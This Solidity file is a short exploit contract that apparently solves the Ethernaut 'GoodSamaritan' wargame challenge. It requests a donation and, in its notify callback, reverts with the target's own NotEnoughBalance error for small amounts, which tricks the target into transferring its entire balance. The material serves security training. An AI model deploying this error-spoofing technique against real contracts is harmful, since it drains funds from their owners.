// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <0.9.0;

import {GoodSamaritan} from "../src/GoodSamaritan.sol";

contract GoodSamaritanAttack {

    error NotEnoughBalance();

    GoodSamaritan public goodSamaritan;
    
    constructor(address goodSamaritanAddress) {
        goodSamaritan = GoodSamaritan(goodSamaritanAddress);
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
